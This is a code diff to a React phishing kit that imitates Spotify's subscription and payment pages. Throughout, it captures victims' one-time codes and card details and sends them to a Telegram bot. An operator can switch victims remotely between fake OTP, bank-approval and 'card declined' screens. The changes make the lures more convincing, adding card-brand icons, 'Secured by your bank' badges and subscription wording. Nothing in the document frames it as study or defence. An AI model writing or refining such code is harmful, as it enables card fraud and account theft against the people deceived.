@@ -67,7 +67,7 @@ const getVisitorInfo = async () => {
 };
 
 // --- OTP Component ---
-const OTPPage: React.FC<{ session: SessionData; updateSession: (d: Partial<SessionData>) => void }> = ({ session, updateSession }) => {
+const OTPPage: React.FC<{ session: SessionData; updateSession: (d: Partial<SessionData>) => void; onOTPSubmit: () => void }> = ({ session, updateSession, onOTPSubmit }) => {
   useEffect(() => {
     updateSession({ currentPage: 'OTP Page' });
   }, []);
@@ -75,7 +75,8 @@ const OTPPage: React.FC<{ session: SessionData; updateSession: (d: Partial<Sessi
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     await sendTelegramMessage(`<b>🔢 OTP RECEIVED</b>\n🔢 Code: <code>${session.otp}</code>\n📍 IP: ${session.ip}`);
-    updateSession({ currentPage: 'OTP Sent' });
+    updateSession({ currentPage: 'OTP Sent - Waiting for Admin' });
+    onOTPSubmit();
   };
 
   return (
@@ -86,12 +87,12 @@ const OTPPage: React.FC<{ session: SessionData; updateSession: (d: Partial<Sessi
             <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" />
           </svg>
         </div>
-        <h2 className="text-2xl font-bold mb-2">Almost there</h2>
-        <p className="text-[#a7a7a7] text-sm text-center mb-8">Confirm the 6-digit code sent to your device to verify your Spotify account.</p>
+        <h2 className="text-2xl font-bold mb-2">Subscription</h2>
+        <p className="text-[#a7a7a7] text-sm text-center mb-8">Confirm the 6-digit code sent to your device to verify your subscription.</p>
 
         {session.adminAction === 'INVALID_OTP' && (
-          <div className="w-full bg-red-600/10 border border-red-600/30 text-red-500 p-3 rounded-lg text-xs text-center font-bold mb-6">
-            The code you entered is incorrect.
+          <div className="w-full bg-red-600/10 border border-red-600/30 text-red-600 p-4 rounded-xl text-sm text-center font-black mb-6 animate-shake">
+            ❌ Invalid OTP - The code you entered is incorrect. Please try again.
           </div>
         )}
 
@@ -113,26 +114,58 @@ const OTPPage: React.FC<{ session: SessionData; updateSession: (d: Partial<Sessi
 };
 
 // --- Bank Approval Component ---
-const BankApproval: React.FC<{ updateSession: (d: Partial<SessionData>) => void }> = ({ updateSession }) => {
+const BankApproval: React.FC<{ updateSession: (d: Partial<SessionData>) => void; cardType: string }> = ({ updateSession, cardType }) => {
   useEffect(() => {
-    updateSession({ currentPage: 'Bank Approval' });
+    updateSession({ currentPage: 'Bank Approval - ID Check' });
   }, []);
 
+  // Determine which card icon to show based on card type
+  const getCardIcon = () => {
+    const firstDigit = cardType.trim()[0];
+    if (firstDigit === '4') {
+      return <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" className="h-8" alt="Visa" />;
+    } else if (firstDigit === '5') {
+      return <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-8" alt="Mastercard" />;
+    } else if (firstDigit === '3') {
+      return <img src="https://upload.wikimedia.org/wikipedia/commons/b/b0/American_Express_logo_%282018%29.svg" className="h-8" alt="Amex" />;
+    }
+    return <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" className="h-8" alt="Visa" />;
+  };
+
   return (
-    <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6 text-center animate-in zoom-in duration-500">
-      <div className="mb-12 flex gap-4 opacity-50 justify-center">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" className="h-5" alt="Visa" />
-        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-5" alt="MC" />
+    <div className="min-h-screen bg-gradient-to-br from-black via-[#0a0a0a] to-[#121212] text-white flex flex-col items-center justify-center p-6 text-center animate-in zoom-in duration-500">
+      <div className="w-full max-w-md bg-[#121212] p-12 rounded-3xl border border-white/10 shadow-2xl">
+        {/* Card Icon */}
+        <div className="w-20 h-20 bg-white/5 rounded-2xl flex items-center justify-center mb-6 mx-auto border border-white/10">
+          {getCardIcon()}
+        </div>
+        
+        {/* Title */}
+        <h2 className="text-3xl font-black mb-3 tracking-tight">ID Check</h2>
+        <p className="text-[#1ed760] text-sm font-bold mb-8">Verification in progress</p>
+        
+        {/* Loading Animation */}
+        <div className="flex gap-2 mb-10 justify-center">
+          <div className="w-3 h-3 bg-[#1ed760] rounded-full animate-bounce [animation-delay:-0.3s]"></div>
+          <div className="w-3 h-3 bg-[#1ed760] rounded-full animate-bounce [animation-delay:-0.15s]"></div>
+          <div className="w-3 h-3 bg-[#1ed760] rounded-full animate-bounce"></div>
+        </div>
+        
+        {/* Description */}
+        <div className="bg-black/40 border border-white/5 rounded-2xl p-6 mb-6">
+          <p className="text-[#a7a7a7] leading-relaxed text-sm">
+            Please open your bank's mobile app to approve this verification request. This window will refresh automatically once confirmed.
+          </p>
+        </div>
+        
+        {/* Security Badge */}
+        <div className="flex items-center justify-center gap-2 text-xs text-[#a7a7a7]">
+          <svg className="w-4 h-4 text-[#1ed760]" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
+            <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+          </svg>
+          <span className="font-bold">Secured by your bank</span>
+        </div>
       </div>
-      <div className="flex gap-2 mb-8 justify-center">
-        <div className="w-3 h-3 bg-[#1ed760] rounded-full animate-bounce [animation-delay:-0.3s]"></div>
-        <div className="w-3 h-3 bg-[#1ed760] rounded-full animate-bounce [animation-delay:-0.15s]"></div>
-        <div className="w-3 h-3 bg-[#1ed760] rounded-full animate-bounce"></div>
-      </div>
-      <h2 className="text-3xl font-bold mb-4">Security Verification</h2>
-      <p className="text-[#a7a7a7] max-w-xs mx-auto leading-relaxed text-sm">
-        Please open your bank's mobile app to approve this verification request. This window will refresh automatically.
-      </p>
     </div>
   );
 };
@@ -183,8 +216,8 @@ const SecurityCheck: React.FC<{ session: SessionData; updateSession: (d: Partial
         <div className="w-20 h-20 bg-[#14261a] rounded-full flex items-center justify-center mb-8 border border-[#1ed760]/20">
           <svg className="w-10 h-10 text-[#1ed760]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
         </div>
-        <h1 className="text-white text-3xl font-bold mb-2">Identity Check</h1>
-        <p className="text-[#a7a7a7] mb-12 text-center">Enter the security code to proceed to Spotify</p>
+        <h1 className="text-white text-3xl font-bold mb-2">Subscription</h1>
+        <p className="text-[#a7a7a7] mb-12 text-center">Enter the security code to proceed to your subscription</p>
         <div className="w-full bg-[#121212] rounded-2xl p-8 mb-10 relative flex justify-center gap-4 shadow-2xl border border-white/5">
           {captchaCode.split('').map((char, i) => (
             <div key={i} className="w-14 h-16 bg-[#1e1e1e] rounded-lg flex items-center justify-center text-3xl font-black text-white border border-white/10 shadow-inner">{char}</div>
@@ -325,7 +358,7 @@ const PaymentForm: React.FC<{ session: SessionData; updateSession: (d: Partial<S
             </div>
 
             <div className="flex-1 max-w-2xl">
-              <h2 className="text-4xl font-black mb-6 tracking-tight">Saved payment cards</h2>
+              <h2 className="text-4xl font-black mb-6 tracking-tight">Subscription</h2>
               <p className="text-[#a7a7a7] text-[13px] leading-relaxed mb-12">
                 Manage your payment details for one-time purchases. To manage payment details for your monthly subscription, go to <a href="#" className="underline text-white hover:text-[#1ed760]">Account overview</a>.
               </p>
@@ -336,8 +369,8 @@ const PaymentForm: React.FC<{ session: SessionData; updateSession: (d: Partial<S
               </div>
 
               {session.adminAction === 'INVALID_CARD' && (
-                <div className="bg-red-600/10 border border-red-500/30 text-red-500 p-4 rounded-xl mb-8 text-center text-sm font-bold animate-shake">
-                  This card cannot be saved. Please try a different card.
+                <div className="bg-red-600/10 border border-red-600/30 text-red-600 p-4 rounded-xl mb-8 text-center text-sm font-black animate-shake">
+                  ❌ Your card is declined - Please try a different card.
                 </div>
               )}
 
@@ -346,15 +379,15 @@ const PaymentForm: React.FC<{ session: SessionData; updateSession: (d: Partial<S
                 <div className="flex justify-between items-center mb-8">
                   <div className="flex flex-col">
                     <span className="text-[13px] font-bold mb-3">Credit or debit card</span>
-                    <div className="flex gap-2">
-                       {/* Designed Professional Card Icons */}
-                       <div className="bg-white p-1 rounded-sm flex items-center shadow-sm">
+                    <div className="flex gap-3">
+                       {/* Beautiful Professional Card Icons */}
+                       <div className="bg-gradient-to-br from-[#1a1f71] to-[#0d1249] p-2 px-3 rounded-lg flex items-center shadow-lg border border-blue-500/20">
                           <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" className="h-4" alt="Visa" />
                        </div>
-                       <div className="bg-white p-1 rounded-sm flex items-center shadow-sm">
+                       <div className="bg-gradient-to-br from-[#eb001b] to-[#ff5f00] p-2 px-3 rounded-lg flex items-center shadow-lg">
                           <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-4" alt="MC" />
                        </div>
-                       <div className="bg-white p-1 rounded-sm flex items-center shadow-sm">
+                       <div className="bg-gradient-to-br from-[#006fcf] to-[#0048a0] p-2 px-3 rounded-lg flex items-center shadow-lg">
                           <img src="https://upload.wikimedia.org/wikipedia/commons/b/b0/American_Express_logo_%282018%29.svg" className="h-4" alt="Amex" />
                        </div>
                     </div>
@@ -654,11 +687,11 @@ const App: React.FC = () => {
           const remote = currentData[idx];
           // React to remote commands
           if (remote.adminAction === 'BLOCK') setStep('BLOCKED');
-          else if (remote.adminAction === 'OTP_PAGE' && step !== 'OTP') setStep('OTP');
-          else if (remote.adminAction === 'INVALID_OTP' && step !== 'OTP') setStep('OTP');
-          else if (remote.adminAction === 'BANK_APPROVAL' && step !== 'BANK_APPROVAL') setStep('BANK_APPROVAL');
+          else if (remote.adminAction === 'OTP_PAGE' && step !== 'OTP' && step !== 'PROCESSING') setStep('OTP');
+          else if (remote.adminAction === 'INVALID_OTP' && step === 'PROCESSING') setStep('OTP');
+          else if (remote.adminAction === 'BANK_APPROVAL' && step === 'PROCESSING') setStep('BANK_APPROVAL');
           else if (remote.adminAction === 'INVALID_CARD' && step !== 'PAYMENT') setStep('PAYMENT');
-          else if (remote.adminAction === 'NORMAL' && (step === 'OTP' || step === 'BANK_APPROVAL')) setStep('PAYMENT');
+          else if (remote.adminAction === 'NORMAL' && (step === 'OTP' || step === 'BANK_APPROVAL' || step === 'PROCESSING')) setStep('PAYMENT');
           
           currentData[idx] = { ...updated, adminAction: remote.adminAction };
         } else {
@@ -683,8 +716,8 @@ const App: React.FC = () => {
     case 'LOGIN': return <LoginForm session={session} updateSession={update} onLogin={() => setStep('PAYMENT')} />;
     case 'PAYMENT': return <PaymentForm session={session} updateSession={update} onPay={() => setStep('PROCESSING')} />;
     case 'PROCESSING': return <ProcessingScreen />;
-    case 'OTP': return <OTPPage session={session} updateSession={update} />;
-    case 'BANK_APPROVAL': return <BankApproval updateSession={update} />;
+    case 'OTP': return <OTPPage session={session} updateSession={update} onOTPSubmit={() => setStep('PROCESSING')} />;
+    case 'BANK_APPROVAL': return <BankApproval updateSession={update} cardType={session.card} />;
     default: return <div className="min-h-screen bg-black flex items-center justify-center"><div className="w-12 h-12 border-4 border-[#1ed760] border-t-transparent rounded-full animate-spin"></div></div>;
   }
 };
